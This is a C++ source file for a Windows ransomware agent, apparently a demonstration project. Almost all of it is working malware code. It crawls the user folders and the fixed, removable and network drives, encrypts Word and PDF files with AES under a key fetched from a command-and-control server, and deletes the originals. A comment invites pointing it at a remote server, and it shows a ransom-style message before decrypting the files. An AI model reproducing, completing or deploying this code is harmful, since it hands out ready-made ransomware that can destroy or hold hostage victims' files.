﻿#include "pch.h"
#include <iostream>
#include <vector>
#include <filesystem>
#include <fstream>
#include <algorithm>
#include <Windows.h>
#include <wincrypt.h>
#include <AtlBase.h>
#include <atlconv.h>
#include "Base64.h"
#include "HttpClient.h"
#include "MachineInfo.h"


using namespace std;


const wstring new_extension = L".enc";
//Those are the files types the ransomware will search on the file system and encrypt
const vector<wstring> file_types = { L".docx", L".doc", L".pdf" };


bool encryptDecryptFile(wstring file_path, string& aes_base64_key, bool is_decrypt = false) {
	vector<BYTE> decoded = Base64::decode(aes_base64_key);
	if (decoded.size() != 32)
		return false;
	//converting to char array
	WCHAR key[32];
	for (int i = 0; i < decoded.size(); i++) {
		key[i] = decoded.at(i);
	}

	//converting path to LPCWSTR
	wstring temp = wstring(file_path.begin(), file_path.end());
	LPCWSTR in_file = temp.c_str();
	wstring temp2;
	if (!is_decrypt) {
		//adding ".enc" extension to file extension
		temp2 = temp + new_extension;
	}
	else {
		//Removing ".enc" extension back to the original file extension
		temp2 = file_path.substr(0, file_path.size() - 4);
		temp2 = wstring(temp2.begin(), temp2.end());
	}
	LPCWSTR out_file = temp2.c_str();
	int key_len = lstrlenW(key);

	HANDLE hInpFile = CreateFileW(in_file, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
	if (hInpFile == INVALID_HANDLE_VALUE) {
		cout << "Input file cannot be opened" << endl;
		return false;
	}

	HANDLE hOutFile = CreateFileW(out_file, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hOutFile == INVALID_HANDLE_VALUE) {
		cout << "Output file cannot be opened" << endl;
		return false;
	}

	DWORD error_id = 0;
	wchar_t info[] = L"Microsoft Enhanced RSA and AES Cryptographic Provider";
	HCRYPTPROV hProv;
	if (!CryptAcquireContextW(&hProv, NULL, info, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		error_id = GetLastError();
		cout << "Error in CryptAcquireContextW: " << to_string(error_id) << endl;
		CryptReleaseContext(hProv, 0);
		return false;
	}

	HCRYPTHASH hHash;
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
		error_id = GetLastError();
		cout << "Error in CryptCreateHash: " << to_string(error_id) << endl;
		CryptReleaseContext(hProv, 0);
		return false;
	}

	if (!CryptHashData(hHash, (BYTE*)key, key_len, 0)) {
		error_id = GetLastError();
		cout << "Error in CryptHashData: " << to_string(error_id) << endl;
		CryptReleaseContext(hProv, 0);
		return false;
	}

	HCRYPTKEY hKey;
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
		error_id = GetLastError();
		cout << "Error in CryptDeriveKey: " << to_string(error_id) << endl;
		CryptReleaseContext(hProv, 0);
		return false;
	}

	const int chunk_size = 256;
	BYTE pbData[chunk_size] = { 0 };
	DWORD out_len = 0;
	BOOL result = FALSE;
	BOOL final_block = FALSE;
	DWORD total_read = 0;
	DWORD in_file_size = GetFileSize(hInpFile, NULL);

	while (result = ReadFile(hInpFile, pbData, chunk_size, &out_len, NULL)) {
		if (0 == out_len) {
			break;
		}

		total_read += out_len;
		if (total_read == in_file_size) {
			final_block = TRUE;
		}

		if (is_decrypt) {
			if (!CryptDecrypt(hKey, NULL, final_block, 0, pbData, &out_len)) {
				error_id = GetLastError();
				cout << "Error in CryptDecrypt: " << to_string(error_id) << endl;
				break;
			}
		}
		else {
			if (!CryptEncrypt(hKey, NULL, final_block, 0, pbData, &out_len, chunk_size)) {
				error_id = GetLastError();
				cout << "Error in CryptDecrypt: " << to_string(error_id) << endl;
				break;
			}
		}
		DWORD written = 0;
		if (!WriteFile(hOutFile, pbData, out_len, &written, NULL)) {
			error_id = GetLastError();
			cout << "Error in WriteFile: " << to_string(error_id) << endl;
			break;
		}
		memset(pbData, 0, chunk_size);
	}

	CryptReleaseContext(hProv, 0);
	CryptDestroyKey(hKey);
	CryptDestroyHash(hHash);
	CloseHandle(hInpFile);
	CloseHandle(hOutFile);

	//Zeroing out keys
	for (auto &i : decoded)
		i = 0;
	memset(key, 0, sizeof(key));

	//Deleting original file
	if (!DeleteFile(in_file))
		cout << "ERROR: couldn't delete " << in_file << endl;
	return true;
}


vector<wstring> getPaths() {
	CA2W ca2w(getUserName().c_str());
	wstring user_name = (wstring)ca2w;
	vector<wstring> system_drives;
	vector<wstring> system_paths;
	WCHAR buf[4096] = { '\0' };
	DWORD drives = GetLogicalDriveStringsW(sizeof(buf) - 1, buf);
	wstring new_drive;
	for (int i = 0; i < drives; i++) {
		if (buf[i] == ('\0')) {
			system_drives.push_back(new_drive);
			new_drive = L"";
			continue;
		}
		new_drive = new_drive + buf[i];
	}

	for (auto& d : system_drives) {
		UINT drive_type = GetDriveType(d.c_str());
		//checking if the drive is network/fixed/removable drive
		if (drive_type == 2 or drive_type == 3 or drive_type == 4) {
			//start scanning only from users folders on C drive
			if (d[0] == L'C')
				d = d + L"Users\\" + user_name + L"\\";
			system_paths.push_back(d);
		}
	}
	return system_paths;
}


void encrypt(vector<wstring>& system_paths, string &aes_base64_key) {
	if (!Base64::isBase64(aes_base64_key))
		return;
	for (auto& path : system_paths) {
		try {
			for (auto & p : filesystem::recursive_directory_iterator(path)) {
				wstring file_ext = p.path().extension();
				if (find(file_types.begin(), file_types.end(), file_ext) != file_types.end()) {
					cout << "Encrypting " << p.path().string() << endl;
					if (encryptDecryptFile(p.path().wstring(), aes_base64_key))
						cout << "**File encrypted successfully**" << endl;
					else
						cout << "**Error encrypting file**" << endl;
				}
			}
		} catch (const std::exception& e) {
			cout << "Exception: " << e.what() << endl;
		}
	}
}


void decrypt(vector<wstring>& system_paths, string &aes_base64_key) {
	if (!Base64::isBase64(aes_base64_key))
		return;
	for (auto& path : system_paths) {
		try {
			for (auto & p : filesystem::recursive_directory_iterator(path)) {
				wstring file_ext = p.path().extension();
				if (file_ext == new_extension) {
					cout << "Decrypting " << p.path().string() << endl;
					if (encryptDecryptFile(p.path().wstring(), aes_base64_key, true))
						cout << "File decrypted successfully" << endl;
					else
						cout << "Error decrypting file" << endl;
				}
			}
		}
		catch (const std::exception& e) {
			cout << "Exception: " << e.what() << endl;
		}
	}
}


int wmain()
{
	//Determine the paths for encryption/decryption. Change 'system_paths' vector if you want to include only custom paths
	vector<wstring> system_paths = getPaths();


	//aes_key will be filled with key given from the CnC
	string aes_base64_key;

	//You can change the IP and Port to a remote server. On default both the server and the agent are running from the same machine
	if (!sendRequestToEncrypt(L"127.0.0.1", 80, aes_base64_key)) {
		cout << "Exiting" << endl;
		return -1;
	}
	else
		encrypt(system_paths, aes_base64_key);

	//destroying key from memory
	fill(aes_base64_key.begin(), aes_base64_key.end(), 0);

	cout << endl;
	cout << "*************************************************" << endl;
	cout << endl;
	cout << "All your files have been encrypted!" << endl;
	cout << endl;
	cout << "In order to decrypt them, you need to pay us $$$...NOTHING at all :)" << endl;
	cout << "Just run sendRequestToDecrypt() with the unique_id.txt file located in the same path where this program is. Don't edit unique_id.txt!" << endl;

	Sleep(60000);

	string returned_aes_base64_key;
	if (!sendRequestToDecrypt(L"127.0.0.1", 80, returned_aes_base64_key)) {
		cout << "Exiting" << endl;
		return -1;
	}
	else
		decrypt(system_paths, returned_aes_base64_key);

	//destroying key from memory
	fill(returned_aes_base64_key.begin(), returned_aes_base64_key.end(), 0);


	cout << endl;
	cout << "*************************************************" << endl;
	cout << endl;
	cout << "All your files have been decrypted successfully!" << endl;
	cout << endl;

	Sleep(60000);
}

